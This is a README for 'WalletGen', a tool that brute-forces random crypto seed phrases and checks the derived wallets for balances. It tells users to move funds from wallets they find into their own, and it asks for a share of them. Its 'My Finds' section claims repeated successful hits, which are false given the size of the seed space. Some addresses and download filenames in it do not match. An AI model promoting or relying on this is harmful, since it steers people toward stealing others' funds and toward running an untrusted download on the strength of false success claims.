# Seed Phrase Generator (WalletGen) – Crypto Wallet Generator & Balance Finder for Lost Bitcoin (BTC), Ethereum (ETH), BNB, Polygon (MATIC) and EVM Chains & Bitcoin Wallet Recover

**WalletGen** is an open-source, ultra-fast **crypto wallet generator** and **seed phrase brute force tool**. It helps you find and recovery lost or inactive **Bitcoin (BTC)**, **Ethereum (ETH)**, **BNB**, **Polygon (MATIC)**, and other **EVM-compatible wallets** with real-time balance checking and high-performance C++ engine.

<!--
Meta description:
WalletGen is a high-speed, open-source crypto wallet generator and balance finder for Bitcoin, Ethereum, and other EVM-compatible blockchains. It allows brute-force seed phrase testing, wallet generation, and recovery of lost crypto wallets using databases or real-time balance checks.
-->

## Quick Navigation
- [How It Works](#how-it-works)
- [Why WalletGen](#why-walletgen)
- [Features](#features)
- [Download WalletGen](#how-to-start)
- [Database Download](#download-and-use-database-for-more-speed)
- [The Program Found a Wallet - What Next?](#the-program-found-a-wallet--whats-next)
- [Recovery Your Bitcoin Wallet](#recovery-your-bitcoin-wallet)
- [My Finds](#my-finds)
- [FAQ](#-frequently-asked-questions-faq)
- [Build Instructions](#building-the-project)
- [Donate](#donate)

[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20MacOS%20%7C%20Linux-blue)](../../releases/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)
![discord](https://img.shields.io/badge/discord-tonydevbtc-blue.svg?logo=discord&label=discord)
[![x](https://img.shields.io/badge/@tonydevbtc-black.svg?logo=x)](https://x.com/tonydevbtc)

<p align="center">
    <img width="1000" alt="WalletGen" title="WalletGen" height="460" src="https://github.com/user-attachments/assets/eadd36d0-1bf2-4b21-a4e5-b6db2b1249ac" />
</p>


<p align="center">
    <img width="1000" alt="WalletGen" title="WalletGen" height="460" src="/screenshots/walletgen_macos1.webp" />
</p>


## How It Works

WalletGen generates wallets using [BIP39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki), [BIP44](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki), and [Bech32](https://en.bitcoin.it/wiki/Bech32) for Bitcoin, and [Keccak256](https://emn178.github.io/online-tools/keccak_256.html) hashing for EVM-based chains like Ethereum.

The software compares generated addresses against known address databases or checks balances in real-time via public blockchain explorers. 

##  Why WalletGen?

Unlike Python-based brute force tools, **WalletGen** is written in C++ and optimized for multi-threaded CPU and GPU usage, delivering up to **10x faster** performance. Whether you’re exploring lost wallets, verifying private key space, or recovering your own wallet, WalletGen gives you the power to do it efficiently and securely.

## Supported Blockchains

-   Bitcoin (BTC)
-   Ethereum (ETH)
-   Binance Smart Chain (BNB)
-   Any EVM-compatible chain

# Demo

### Windows
<p align="center">
    <img width="1000" height="460" alt="WalletGen bitcoin recovery" title="WalletGen - Bitcoin Recovery Demo" src="/screenshots/left.webp" />
</p>

### MacOS

<p align="center">
    <img width="1000" height="460" alt="WalletGen bitcoin recovery" title="WalletGen - Bitcoin Recovery Demo" src="/screenshots/walletgen_macos2.webp" />
</p>

### Linux

<p align="center">
    <img width="1000" height="460" alt="WalletGen on Linux" title="WalletGen - Linux Recovery" src="/screenshots/log.webp" />
</p>

# How to start

## Windows 
- Download [Release](../../releases/walletgen) 
- Unpack anywhere
- Run `WalletGen.exe`


## MacOS
- Download [Release](../../releases/walletgen) 

## Linux (x86-64bit)

```bash
wget https://github.com/tonybtc1/walletgen/releases/download/walletgen/WalletGen_linux_x64.5.0-linux.tar.gz
tar -xzf walletgen-v1.5.0-linux.tar.gz
cd walletgen
./walletgen
```

Or download [Release for Linux](../../releases/walletgen) 

### Download and Use Database (for more speed)
| Database                                                     | Download link                                |  File Size                             | Number of Addresses  |
|---------------------------------------------------------|------------------------------------------------|------------------------------------|----------------------------------|
| BTC Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[btc_database.txt](https://github.com/tonybtc1/seed-phrase-generator/releases/download/database/btc_database.txt)  | 1.03 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23 428 179
| EVM Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[evm_database.txt](https://github.com/tonybtc1/seed-phrase-generator/releases/download/database/evm_database.txt)  | 1.02 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;25 999 700


## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** allows you to search using brute-force method for two types of crypto wallets with an existing balance.

### For Bitcoin (BTC) wallets:

* Press key 3 in the menu or run start_search_btc.bat to search Bitcoin wallets through the internet. This method may take longer, as it checks wallet balances in real-time via blockchain explorers.
* Press key 6 to search Bitcoin wallets using the database. This method is faster because it compares generated wallets against a pre-built database of known addresses with balances.

### For EVM wallets (Ethereum, BNB, MATIC, etc.):

* Press key 5 or run start_search_evm.bat to search EVM wallets through the internet. This method checks for wallets with balance in real-time through blockchain explorers.
* Press key 6 to search EVM wallets using the database. This method is faster since it compares generated wallets against the known database of addresses with balance.

### Speed Considerations:

* The speed of the search depends heavily on your hardware, especially the graphics card (GPU). To speed up the process and increase your chances of finding a wallet with a balance, you can run multiple instances of the program (1 to 4), depending on your system's performance

By using the database, you can significantly improve the efficiency of your search, as it eliminates the need to query the blockchain for every wallet generated

## The Program Found a Wallet — What’s Next?
When the program finds a wallet with a balance, it will:
* **Stop** immediately
* **Display** the wallet details in the console
* **Save** this data in the ``found_wallets.txt`` file

### How to Access the Funds?
1. Import the **mnemonic seed phrase** from the found wallet into any compatible crypto wallet (such as Metamask, Trust Wallet, or Electrum).
2. Once restored, you’ll be able to transfer the funds to your own wallet.
   
>  If the find is successful, be sure to share a small portion of the balance you find with me! Thank you!

## Recovery Your Bitcoin Wallet

WalletGen allows you to recover your bitcoin wallet by seed phrase (mnemonic phrase). The program supports entering a complete seed phrase, as well as searching for missing words using special characters.

### Process Description

#### Search for missing words:

If your seed phrase is missing some words or you are unsure, replace those words with an *. WalletGen will search through all possible variations in the places of * to find the correct seed phrase and restore the associated wallet balance.

#### Entering a complete seed-phrase:

If you have a full 12-word seed, simply enter it in full with a space. WalletGen will generate all address types (Legacy, SegWit, P2SH) and check their balances.

![recovery](/screenshots/details.webp)

### Important recommendations

* Seed-phrase must contain exactly 12 words.
* Use only the * symbol to search for missing words.
* Searching for missing words may take considerable time, especially if several words are missing.
* If the wallet with balance is successfully recovered, the program will automatically stop and save the found data.

## My Finds

![mywallet](https://github.com/user-attachments/assets/339c1424-0c2d-4af5-92d0-4cbea7d54682)

I’ve recovered two BTC wallets with a balance. The first had 0.000032 BTC, the second contained 0.0528 BTC (roughly $4800 at the time of discovery).
Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0).

<p align="center">
    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="/screenshots/screenshot.webp" />
</p>

### New Find 4/9/2025

After a week of non-stop wallet searching, I finally found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my 4th and biggest find of all time.

![image](/screenshots/normal.webp)

## New Find 5/5/2025

[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp) - 0.4522 BTC

![image](/screenshots/look.webp)

## New Find 6/18/2025

<p align="center">
    <img width="1000" height="460" src="https://github.com/user-attachments/assets/552d00df-dc70-4c42-9fa9-1cf258681af7" />
</p>

## New Find 8/23/2025

[bc1q05cmxffxaj324epjv5ly0ecncte9an9t33napy](https://mempool.space/address/bc1q05cmxffxaj324epjv5ly0ecncte9an9t33napy) - 0.208 BTC
<p align="center">
<img width="1000" height="460" alt="0.2btc" src="https://github.com/user-attachments/assets/e34fcb20-3d65-43ee-bd0d-1c6d107a0540" />
</p>

## New Find 9/5/2025

[bc1qcwvsavc3tqquxk7fd9xlngcp2vggdvcrnz0yw0](https://mempool.space/address/bc1qcwvsavc3tqquxk7fd9xlngcp2vggdvcrnz0yw0) - 0.7362 BTC
<p align="center">
<img width="1000" height="460" alt="0.7btc" src="https://github.com/user-attachments/assets/986fa246-5b43-44b0-a3db-f3d0519fc999" />
</p>

## New Find 9/7/2025

[bc1qf7ywmr5sfkzfg8zqjl6m9mf68fs9r0c7n08zmt](https://mempool.space/address/bc1qf7ywmr5sfkzfg8zqjl6m9mf68fs9r0c7n08zmt) - 0.0069 BTC \
[bc1q9sd4psdmlj707v0j9np22dhrjxy5c4g92qlk6y](https://mempool.space/address/bc1q9sd4psdmlj707v0j9np22dhrjxy5c4g92qlk6y) - 0.0060 BTC \
[bc1qzesq56xsrtr76czy7tx9v3clsmkgm2752qsrhs](https://mempool.space/address/bc1qzesq56xsrtr76czy7tx9v3clsmkgm2752qsrhs) - 0.0061 BTC \
[bc1qd06fpfckmqv3ne0mhsnj5e4pgqs4lfvsn2vgj9](https://mempool.space/address/bc1qd06fpfckmqv3ne0mhsnj5e4pgqs4lfvsn2vgj9) - 0.0022 BTC

<p align="center">
<img width="1000" height="460" alt="0.02btc" src="https://github.com/user-attachments/assets/09501738-8248-47ee-bf68-8453ded7eb1d" />
</p>

## New Find 9/8/2025

[bc1q6w2a2zv7gn54zhkjzz55upn34uzw20x0pzyy9g](https://mempool.space/address/bc1q6w2a2zv7gn54zhkjzz55upn34uzw20x0pzyy9g) - 0.02057228 BTC
<p align="center">
<img width="1000" height="460" alt="0.7btc" src="https://github.com/user-attachments/assets/d3bf4899-c955-4e93-9f30-cbc51c279ea9" />
</p>

## New Find 9/13/2025

[bc1q8lw46cjq8lalj4m7je7xtkt5hfmhkxeu8gxftp](https://mempool.space/address/bc1q8lw46cjq8lalj4m7je7xtkt5hfmhkxeu8gxftp) - 1.2453 BTC
<p align="center">
<img width="1000" height="460" alt="0.7btc" src="https://github.com/user-attachments/assets/c516ef5c-f76c-4e77-a684-07211fe187b2" />
</p>



## Building the Project

1. Open the project file (`CryptoWalletGen.sln`) in Visual Studio or any compatible C++ compiler.
2. Install the necessary dependencies and build the project.

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.bat
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```

3. Start building the project.

## 🔍 Frequently Asked Questions (FAQ)

### ❓ Where can I download WalletGen?
You can download the WalletGen given on the [release download page](../../releases) 

### ❓ Where can I download a database of known addresses with balance?
You can download the current database given on the [release   page](../../releases) 

### ❓ Can WalletGen help me recover a lost Bitcoin wallet?
Yes. WalletGen uses brute-force seed generation and a known-address database to help users potentially **recover lost Bitcoin wallets**.

### ❓ Is WalletGen a seed phrase generator?
Yes. WalletGen can generate **BIP39 seed phrases** and derive wallets for Bitcoin, Ethereum, and other EVM chains.

### ❓ Do I need the internet to search through the database?
No. Searching through the database does not require an internet connection, as the wallet balance is already known.

### ❓ Can I find Ethereum wallets with balance?
Yes. WalletGen supports scanning for **Ethereum wallets with balance** using brute-force and a database of known addresses.

### ❓ Is WalletGen legal?
WalletGen is intended for **educational and research purposes only**. It should only be used on wallets you own or have permission to access.

## Todo
1. Search for missing words in a seed phrase. - **Done!**

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.

## Donate

I encourage you, when you find a wallet with a balance, to send me a small portion as a thank you. This motivates me to keep working on the program!

**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9

**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693

## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License

This project is licensed under the [MIT License](/LICENSE)


<!--
## Keywords
'bitcoin', 'ethereum', 'crypto', 'cryptocurrency', 'crypto seed phrase mining', 'crypto bruteforce', 'bitcoin bruteforce', 'ethereum bruteforce', 'crypto finder', 'lost bitcoin', 'brute force wallet', 'crypto brute foce', 'crypto bruteforce', 'crypto bruteforce wallet', 'crypto bruteforce key', 'crypto wallet', 'crypto wallet recovery', 'crypto wallet seed generator', 'crypto wallet seed phrase', 'crypto wallet tools', 'wallet finder crypto', 'wallet recovery seeds', 'wallet recovery tools', 'seed phrase', 'seed phrase generator', 'bip39 wallet', 'trezor', 'walletgen', 'crypto mining', 'mnemonic generator', 'crypto recovery', 'recovery crypto', 'bitcoin wallet', 'ethereum wallet', 'seed phrase finder', 'seed phrase wallet', 'seed phrase generator with balance', 'seed phrase balance checker', 'seed phrase trust wallet', 'seed phrase generator and checker', 'seed phrase storage', 'seed phrase word list github', 'bitcoin explorer', 'bitcoin core', 'bitcoin mining', 'ethereum mining', 'lost bitcoin wallet list', 'lost bitcoin wallet finder', 'lost bitcoin wallets', 'lost bitcoin password', 'lost bitcoin addresses', 'lost btc', 'lost bitcoins', 'lost ethereum', 'lost eth', 'crypto mining app', 'crypto mining software', 'mnemonic phrase', 'mnemonic', 'mnemonic phrase generator', 'mnemonic phrase checker', 'mnemonic phrase lost', 'mnemonic phrase to private key', 'mnemonic phrase wallet', 'private key finder', 'private key bitcoin', 'private keys' 'database', 'private key metamask', 'private key to seed phrase', 'private key', 'private key ethereum', 'private key wallet', 'crypto address check', 'brute crypto mining', 'brute crypto'.
-->











